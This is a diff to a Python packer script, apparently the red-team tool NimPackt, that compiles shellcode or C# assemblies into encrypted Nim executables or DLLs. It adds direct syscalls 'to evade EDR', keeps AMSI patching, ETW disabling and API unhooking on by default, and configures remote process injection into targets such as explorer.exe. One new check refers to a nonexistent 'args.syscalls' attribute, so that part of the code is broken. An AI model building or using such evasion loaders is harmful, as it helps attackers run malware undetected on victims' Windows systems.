@@ -187,7 +187,8 @@ def generateSource_RemoteShinject(fileName, cryptedInput, cryptedCoat, cryptIV, 
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
             new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
-            new_line = new_line.replace('#[ PLACEHOLDERINJECTCALL ]#', f"injectShellcodeRemote(decodedPay, \"{injecttarget}\", {str(existingprocess).lower()})")
+            new_line = new_line.replace('#[ PLACEHOLDERTARGETPROC ]#', f"var tProc: string = \"{injecttarget}\"")
+            new_line = new_line.replace('#[ PLACEHOLDERNEWPROC ]#', f"var nProc: bool = {str(not existingprocess).lower()}")
             result += new_line +"\n"
 
     outFilename = os.path.join(outDir, os.path.splitext(os.path.basename(fileName))[0].replace('-', '') + "RemoteShinjectNimPackt.nim")
@@ -201,7 +202,7 @@ def generateSource_RemoteShinject(fileName, cryptedInput, cryptedCoat, cryptIV, 
 
     return outFilename
 
-def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookApis, sleep, disableAmsi, disableEtw, x64, verbose, debug):
+def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookApis, useSyscalls, sleep, disableAmsi, disableEtw, x64, verbose, debug):
     # Compile the generated Nim file for Windows (cross-compile if run from linux)
     # Compilation flags are focused on stripping and optimizing the output binary for size
     if x64:
@@ -216,6 +217,9 @@ def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookAp
 
     try:
         compileCommand = f"nim c -d:danger -d:strip -d:release --hints:off --warnings:off --opt:size --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu}"
+
+        if useSyscalls:
+            compileCommand = compileCommand + " -d:syscalls"
 
         if sleep:
             compileCommand = compileCommand + " -d:calcPrimes"
@@ -242,22 +246,23 @@ def compileNim(fileName, fileType, executionMode, localInject, hideApp, unhookAp
             compileCommand = compileCommand + " -d:remoteShinject"
 
         if fileType == "dll":
-            compileCommand = compileCommand + " --app=lib --nomain -d=exportDll"
+            compileCommand = compileCommand + " --app=lib --nomain -d:exportDll"
             outFileName = os.path.splitext(fileName)[0] + ".dll"
         else:
-            compileCommand = compileCommand + " -d=exportExe"
+            compileCommand = compileCommand + " -d:exportExe"
             outFileName = os.path.splitext(fileName)[0] + ".exe"
 
         if os.name == 'nt':
             # Windows
             print("Compiling Nim binary (this may take a while)...")
-            compileCommand = compileCommand + " --passc=-flto --passl=-flto"
         else:
             # Other (Unix)
             print("Cross-compiling Nim binary for Windows (this may take a while)...")
             compileCommand = compileCommand + " -d=mingw"
 
         compileCommand = compileCommand + f" {fileName}"
+        if debug:
+            print(f"[DEBUG] Compilation command: '{compileCommand}'.")
         os.system(compileCommand)
     except:
         e = sys.exc_info()[0]
@@ -283,39 +288,48 @@ if __name__ == "__main__":
     required.add_argument('-e', '--executionmode', action='store', dest='executionmode', help='Execution mode of the packer. Supports "execute-assembly" or "shinject"', required=True)
     required.add_argument('-i', '--inputfile', action='store', dest='inputfile', help='C# .NET binary executable (.exe) or shellcode (.bin) to wrap', required=True)
     assembly.add_argument('-a', '--arguments', action='store', dest='arguments', default="PASSTHRU", help='Arguments to "bake into" the wrapped binary, or "PASSTHRU" to accept run-time arguments (default)')
+    assembly.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
+    assembly.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW)')
     injection.add_argument('-r', '--remote', action='store_false', dest='localinject', default=True, help='Inject shellcode into remote process (default false)')
     injection.add_argument('-t', '--target', action='store', dest='injecttarget', default="explorer.exe", help='Remote thread targeted for remote process injection (default "explorer.exe", implies -r)')
     injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
+    optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks in the target process by loading a fresh NTDLL.dll')
+    optional.add_argument('-ns', '--nosyscalls', action='store_false', default=True, dest='useSyscalls', help='Do NOT use direct syscalls (Windows generation 7-10) instead of high-level APIs to evade EDR')
     optional.add_argument('-f', '--filetype', action='store', default="exe", dest='filetype', help='Filetype to compile ("exe" or "dll", default: "exe")')
     optional.add_argument('-s', '--sleep', action='store_true', default=False, dest='sleep', help='Sleep for approx. 30 seconds by calculating primes')
-    optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
+    optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode (untested)')
     optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) of executable by compiling it in GUI mode')
-    optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks')
-    optional.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI) (recommended for shellcode)')
-    optional.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW) (recommended for shellcode)')
     optional.add_argument('-d', '--debug', action='store_true', default=False, dest='debug', help='Enable debug mode (retains .nim source file in output folder).')
     optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Print debug messages of the wrapped binary at runtime')
-    optional.add_argument('-V', '--version', action='version', version='%(prog)s 0.9 Beta')
+    optional.add_argument('-V', '--version', action='version', version='%(prog)s 2.0 "EDR Evasion Boogaloo"')
 
     args = parser.parse_args()
 
-    if args.executionmode == "shinject" and args.arguments not in ["", "PASSTHRU"]:
-        print("WARNING: Execute-assembly arguments (-a) will be ignored in 'shinject' mode.")
+    if args.executionmode == "shinject" and (args.arguments not in ["", "PASSTHRU"] or args.patchAmsi != True or args.disableEtw != True):
+        print("WARNING: Execute-assembly arguments (-a, -na, -ne) will be ignored in 'shinject' mode.")
 
     if args.executionmode == "execute-assembly" and (args.localinject == False or args.injecttarget != "explorer.exe" or args.existingprocess == True):
-        print("WARNING: Shinject arguments (-r, -t, and -E) will be ignored in 'execute-assembly' mode.")
+        print("WARNING: Shinject arguments (-r, -t, -E) will be ignored in 'execute-assembly' mode.")
 
     if args.executionmode == "shinject" and args.existingprocess == True:
-        print("WARNING: ⚠ Injecting into existing processes is VERY volatile and is likely to CRASH the target process in its current state. DO NOT USE IN PRODUCTION ⚠")
+        print("WARNING: ⚠ Injecting into existing processes is VERY volatile and is likely to CRASH the target process when exited. USE WITH CAUTION. ⚠")
 
     if args.executionmode == "execute-assembly" and args.filetype == "dll":
         print("WARNING: DLL files will not show console output. Make sure to pack your assembly with arguments to write to output file if you want the output :)")
 
     if args.x64 == False:
-        print("WARNING: Compiling in x86 mode may cause crashes. Compile generated .nim file manually in this case.")
+        print("WARNING: Compiling in x86 mode may cause crashes. Compile generated .nim file manually in this case. Forcing debug mode...")
+        args.debug = True
+
+    if args.x64 == False and args.syscalls == True:
+        raise SystemExit("ERROR: Using direct syscalls is not supported in x86. Change to x64 or disable syscalls with -ns.")
 
     if args.executionmode == "shinject" and (args.injecttarget != "explorer.exe" or args.existingprocess == True):
         args.localinject = False
+
+    if args.executionmode == "shinject":
+        args.patchAmsi = False
+        args.disableEtw = False
 
     cryptedInput, cryptedCoat, cryptIV, cryptKey = cryptFiles(args.inputfile, args.unhookApis, args.x64)
 
@@ -334,4 +348,4 @@ if __name__ == "__main__":
         raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either 'execute-assembly' or 'shinject'.")
 
     compileNim(sourceFile, args.filetype, args.executionmode, args.localinject, args.hideApp, args.unhookApis,
-        args.sleep, args.patchAmsi, args.disableEtw, args.x64, args.verbose, args.debug)
+        args.useSyscalls, args.sleep, args.patchAmsi, args.disableEtw, args.x64, args.verbose, args.debug)
